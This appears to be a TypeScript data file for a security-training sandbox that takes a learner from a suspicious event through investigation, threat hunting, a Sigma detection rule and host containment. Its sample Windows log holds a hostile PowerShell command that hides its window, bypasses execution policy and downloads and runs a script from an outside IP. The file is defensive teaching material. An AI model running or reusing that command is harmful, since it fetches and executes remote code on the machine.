export interface SandboxStep {
  key: 'SIGNAL' | 'INVESTIGATION' | 'UNDERSTANDING' | 'HUNT' | 'ENGINEER' | 'RESPOND';
  label: string;
  title: string;
  description: string;
}

export const SANDBOX_STEPS: SandboxStep[] = [
  { key: 'SIGNAL', label: '1. SIGNAL', title: 'Suspicious Telemetry Ingested', description: 'Anomalous event captured from an active production endpoint.' },
  { key: 'INVESTIGATION', label: '2. INVESTIGATION', title: 'Examine Critical Log Artifacts', description: 'Deep-dive into process executions and command arguments.' },
  { key: 'UNDERSTANDING', label: '3. UNDERSTANDING', title: 'Map Process Lineage', description: 'Establish the parent-child flow to reconstruct attacker actions.' },
  { key: 'HUNT', label: '4. HUNT', title: 'Enterprise-Wide Scope Search', description: 'Identify other compromised hosts using hunting queries.' },
  { key: 'ENGINEER', label: '5. ENGINEER', title: 'Codify Resilient Detection', description: 'Author formal Sigma rules to prevent future blindspots.' },
  { key: 'RESPOND', label: '6. RESPOND', title: 'Active Host Containment', description: 'Contain the adversary and secure corporate boundaries.' },
];

export const RAW_SECURITY_LOG = {
  "EventHeader": {
    "Timestamp": "2026-09-25T11:42:01.004Z",
    "EventID": 4688,
    "TaskCategory": "Process Creation",
    "Computer": "DC01.BLACKPERL.INTERNAL"
  },
  "EventData": {
    "SubjectUserSid": "S-1-5-18 (Local System)",
    "SubjectUserName": "SYSTEM",
    "NewProcessId": "0x3bc4",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://103.45.12.89/payload.ps1')\"",
    "MandatoryLabel": "Mandatory Label\\System Mandatory Level"
  }
};

export const SIGMA_TEMPLATE = `title: Suspicious PowerShell Web Ingestion
id: f4808722-df38-4e89-a2cd-f509cc141c2d
status: experimental
description: Detects scheduled tasks invoking PowerShell with Net.WebClient DownloadString indicators.
logsource:
  product: windows
  category: process_creation
detection:
  selection_process:
    Image|endswith:
      - 'IMAGE_VALUE'
  selection_args:
    CommandLine|contains:
      - 'COMMAND_VALUE'
  condition: selection_process and selection_args
falsepositives:
  - Administrative setup scripts (rare)
level: critical`;
